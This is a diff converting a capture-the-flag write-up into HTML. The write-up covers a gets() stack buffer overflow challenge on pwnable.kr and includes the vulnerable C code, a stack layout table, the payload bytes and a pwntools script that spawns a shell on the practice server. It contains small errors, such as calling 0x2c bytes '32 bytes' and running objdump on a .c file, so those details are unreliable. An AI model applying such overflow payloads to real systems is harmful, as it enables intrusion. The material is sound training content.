@@ -1,14 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Challenge 3: Buffer Overflow</title>
+</head>
+<body>
+    <hr>
+    <h1>Challenge 3: Buffer Overflow</h1>
 
----
+    <h3>Challenge Code</h3>
 
-# **Challenge 3: Buffer Overflow**
-
-### **Challenge Code**
-
-```c
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
+    <pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
 
 void func(int key) {
     char overflowme[32];
@@ -24,97 +29,164 @@ void func(int key) {
 int main(int argc, char* argv[]) {
     func(0xdeadbeef);
     return 0;
-}
-```
+}</code></pre>
 
----
+    <hr>
 
-### **Challenge Objective**
-In this challenge, we will:
-- Understand what a buffer overflow is.
-- Exploit the `gets()` vulnerability to overwrite the `key` variable with the value `0xcafebabe`.
-- When the condition `key == 0xcafebabe` is true, the program executes `system("/bin/sh")`, providing a shell to capture the flag.
+    <h3>Challenge Objective</h3>
+    <p>In this challenge, we will:</p>
+    <ul>
+        <li>Understand what a buffer overflow is.</li>
+        <li>Exploit the <code>gets()</code> vulnerability to overwrite the <code>key</code> variable with the value <code>0xcafebabe</code>.</li>
+        <li>When the condition <code>key == 0xcafebabe</code> is true, the program executes <code>system("/bin/sh")</code>, providing a shell to capture the flag.</li>
+    </ul>
 
----
+    <hr>
 
-### **Understanding Buffer Overflow**
-A **buffer overflow** occurs when we input more data than a variable can hold, causing it to overwrite adjacent memory zones. Every variable in a program is assigned a specific memory zone, but if we can write beyond the boundaries of that memory, we can overwrite other variables, stack pointers, or return addresses.
+    <h3>Understanding Buffer Overflow</h3>
+    <p>A <strong>buffer overflow</strong> occurs when we input more data than a variable can hold, causing it to overwrite adjacent memory zones. Every variable in a program is assigned a specific memory zone, but if we can write beyond the boundaries of that memory, we can overwrite other variables, stack pointers, or return addresses.</p>
 
-In this case:
-1. The `gets()` function does not perform bounds checking and allows input longer than `overflowme`’s allocated size of 32 bytes.
-2. This overflow can overwrite the `key` variable, which is stored nearby in memory.
+    <p>In this case:</p>
+    <ol>
+        <li>The <code>gets()</code> function does not perform bounds checking and allows input longer than <code>overflowme</code>'s allocated size of 32 bytes.</li>
+        <li>This overflow can overwrite the <code>key</code> variable, which is stored nearby in memory.</li>
+    </ol>
 
----
+    <hr>
 
-### **Plan to Exploit**
-Our goal is to:
-1. **Overflow the buffer** (`overflowme`) and write enough data to overwrite the memory where the `key` variable is stored.
-2. **Set `key = 0xcafebabe`** by carefully crafting our payload.
+    <h3>Plan to Exploit</h3>
+    <p>Our goal is to:</p>
+    <ol>
+        <li><strong>Overflow the buffer</strong> (<code>overflowme</code>) and write enough data to overwrite the memory where the <code>key</code> variable is stored.</li>
+        <li><strong>Set <code>key = 0xcafebabe</code></strong> by carefully crafting our payload.</li>
+    </ol>
 
----
+    <hr>
 
-### **Analyzing the Code**
+    <h3>Analyzing the Code</h3>
 
-#### **Vulnerable Function: `func()`**
-1. **Overflow Variable:**
-   - `overflowme` is a 32-byte buffer located at `ebp - 0x2c` (32 bytes below the base pointer).
-   
-2. **Key Variable:**
-   - The `key` variable is passed as a parameter to `func()` and stored at `ebp + 0x8` (8 bytes above the base pointer).
+    <h4>Vulnerable Function: <code>func()</code></h4>
+    <ol>
+        <li>
+            <strong>Overflow Variable:</strong>
+            <ul>
+                <li><code>overflowme</code> is a 32-byte buffer located at <code>ebp - 0x2c</code> (32 bytes below the base pointer).</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Key Variable:</strong>
+            <ul>
+                <li>The <code>key</code> variable is passed as a parameter to <code>func()</code> and stored at <code>ebp + 0x8</code> (8 bytes above the base pointer).</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Critical Instructions:</strong>
+            <ul>
+                <li>
+                    <strong><code>gets(overflowme)</code></strong>:
+                    <ul>
+                        <li>Reads user input directly into <code>overflowme</code> without size checks.</li>
+                        <li>Input longer than 32 bytes will overwrite adjacent memory, including the <code>key</code> variable.</li>
+                    </ul>
+                </li>
+                <li>
+                    <strong>Comparison</strong>:
+                    <ul>
+                        <li>The program checks if the <code>key</code> variable is equal to <code>0xcafebabe</code>:
+                            <pre><code>cmpl 0xcafebabe,0x8(%ebp)</code></pre>
+                        </li>
+                        <li>If the condition is true, the program calls <code>system("/bin/sh")</code>.</li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+    </ol>
 
-3. **Critical Instructions:**
-   - **`gets(overflowme)`**:
-     - Reads user input directly into `overflowme` without size checks.
-     - Input longer than 32 bytes will overwrite adjacent memory, including the `key` variable.
-   - **Comparison**:
-     - The program checks if the `key` variable is equal to `0xcafebabe`:
-       ```assembly
-       cmpl 0xcafebabe,0x8(%ebp)
-       ```
-     - If the condition is true, the program calls `system("/bin/sh")`.
+    <hr>
 
----
+    <h3>Exploit Analysis</h3>
 
-### **Exploit Analysis**
+    <p>To overwrite the <code>key</code> variable:</p>
+    <ol>
+        <li>Fill the 32 bytes of <code>overflowme</code> to overflow the buffer.</li>
+        <li>Overwrite the 4 bytes of saved <code>ebp</code>.</li>
+        <li>Overwrite the 4 bytes of the return address (optional; not used in this challenge).</li>
+        <li>Write the value <code>0xcafebabe</code> to the memory location of <code>key</code> at <code>ebp + 0x8</code>.</li>
+    </ol>
 
-To overwrite the `key` variable:
-1. Fill the 32 bytes of `overflowme` to overflow the buffer.
-2. Overwrite the 4 bytes of saved `ebp`.
-3. Overwrite the 4 bytes of the return address (optional; not used in this challenge).
-4. Write the value `0xcafebabe` to the memory location of `key` at `ebp + 0x8`.
+    <h4>Memory Layout</h4>
+    <table border="1">
+        <thead>
+            <tr>
+                <th>Memory Address</th>
+                <th>Content</th>
+                <th>Offset</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><code>ebp - 0x2c</code></td>
+                <td>Start of <code>overflowme</code></td>
+                <td>+0</td>
+            </tr>
+            <tr>
+                <td><code>ebp</code></td>
+                <td>Saved base pointer</td>
+                <td>+0x2c</td>
+            </tr>
+            <tr>
+                <td><code>ebp + 0x4</code></td>
+                <td>Return address</td>
+                <td>+0x30</td>
+            </tr>
+            <tr>
+                <td><code>ebp + 0x8</code></td>
+                <td><code>key</code> variable</td>
+                <td>+0x34</td>
+            </tr>
+        </tbody>
+    </table>
 
-#### **Memory Layout**
-| Memory Address | Content               | Offset |
-| -------------- | --------------------- | ------ |
-| `ebp - 0x2c`   | Start of `overflowme` | +0     |
-| `ebp`          | Saved base pointer    | +0x2c  |
-| `ebp + 0x4`    | Return address        | +0x30  |
-| `ebp + 0x8`    | `key` variable        | +0x34  |
+    <p>To overwrite the <code>key</code> variable, we need:</p>
+    <ul>
+        <li><strong>32 bytes</strong> to fill <code>overflowme</code>.</li>
+        <li><strong>8 bytes</strong> (saved <code>ebp</code> + return address).</li>
+        <li><strong>4 bytes</strong> to write <code>0xcafebabe</code> to <code>key</code>.</li>
+        <li><img src="image.png" alt="couldn't load image"></li>
+    </ul>
 
-To overwrite the `key` variable, we need:
-- **32 bytes** to fill `overflowme`.
-- **8 bytes** (saved `ebp` + return address).
-- **4 bytes** to write `0xcafebabe` to `key`.
-- ![couldn't load image](image.png)
----
+    <hr>
 
-### **Crafting the Payload**
-Using the above analysis, the payload structure is:
-1. **Padding for `overflowme`:**
-   - 32 bytes (`'a' * 0x2c`).
-2. **Padding for `ebp` and return address:**
-   - 8 bytes (`'b' * 0x08`).
-3. **Value for `key`:**
-   - Write `0xcafebabe` in little-endian format (`\xbe\xba\xfe\xca`).
+    <h3>Crafting the Payload</h3>
+    <p>Using the above analysis, the payload structure is:</p>
+    <ol>
+        <li>
+            <strong>Padding for <code>overflowme</code>:</strong>
+            <ul>
+                <li>32 bytes (<code>'a' * 0x2c</code>).</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Padding for <code>ebp</code> and return address:</strong>
+            <ul>
+                <li>8 bytes (<code>'b' * 0x08</code>).</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Value for <code>key</code>:</strong>
+            <ul>
+                <li>Write <code>0xcafebabe</code> in little-endian format (<code>\xbe\xba\xfe\xca</code>).</li>
+            </ul>
+        </li>
+    </ol>
 
----
+    <hr>
 
-### **Python Exploit Script**
+    <h3>Python Exploit Script</h3>
 
-Here’s the Python script to exploit the challenge:
+    <p>Here's the Python script to exploit the challenge:</p>
 
-```python
-from pwn import *
+    <pre><code>from pwn import *
 
 # Connect to the server
 connection = remote("pwnable.kr", 9000)
@@ -131,42 +203,66 @@ print("Payload:", overflow_payload)
 connection.sendline(overflow_payload)
 
 # Interact with the shell
-connection.interactive()
-```
+connection.interactive()</code></pre>
 
----
+    <hr>
 
-### **Steps to Execute the Exploit**
+    <h3>Steps to Execute the Exploit</h3>
 
-1. **Analyze the Disassembly:**
-   - Use `objdump -D bof.c` to confirm the memory layout and validate the `overflowme` and `key` locations.
+    <ol>
+        <li>
+            <strong>Analyze the Disassembly:</strong>
+            <ul>
+                <li>Use <code>objdump -D bof.c</code> to confirm the memory layout and validate the <code>overflowme</code> and <code>key</code> locations.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Run the Script:</strong>
+            <pre><code>python exploit.py</code></pre>
+        </li>
+        <li>
+            <strong>Observe the Shell:</strong>
+            <ul>
+                <li>If successful, the script overwrites <code>key</code> with <code>0xcafebabe</code>, triggering the shell:
+                    <pre><code>$ whoami
+$ ls</code></pre>
+                </li>
+            </ul>
+            <img src="image-1.png" alt="alt text">
+        </li>
+    </ol>
 
-2. **Run the Script:**
-   ```bash
-   python exploit.py
-   ```
+    <hr>
 
-3. **Observe the Shell:**
-   - If successful, the script overwrites `key` with `0xcafebabe`, triggering the shell:
-     ```
-     $ whoami
-     $ ls
-     ```
-    ![alt text](image-1.png)
----
+    <h3>Key Learnings</h3>
 
-### **Key Learnings**
+    <ol>
+        <li>
+            <strong>Buffer Overflow Basics:</strong>
+            <ul>
+                <li>Overwriting memory beyond the bounds of a buffer allows manipulation of other variables or control flow.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Memory Layout Analysis:</strong>
+            <ul>
+                <li>Understanding how variables are stored relative to the stack pointer and base pointer is crucial.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Using Little-Endian Format:</strong>
+            <ul>
+                <li>Most modern architectures store multi-byte values in little-endian order, so hex values must be reversed.</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Automating Exploits:</strong>
+            <ul>
+                <li>Tools like <code>pwntools</code> simplify the creation and execution of payloads for CTF challenges.</li>
+            </ul>
+        </li>
+    </ol>
 
-1. **Buffer Overflow Basics:**
-   - Overwriting memory beyond the bounds of a buffer allows manipulation of other variables or control flow.
-
-2. **Memory Layout Analysis:**
-   - Understanding how variables are stored relative to the stack pointer and base pointer is crucial.
-
-3. **Using Little-Endian Format:**
-   - Most modern architectures store multi-byte values in little-endian order, so hex values must be reversed.
-
-4. **Automating Exploits:**
-   - Tools like `pwntools` simplify the creation and execution of payloads for CTF challenges.
-
----
+    <hr>
+</body>
+</html>
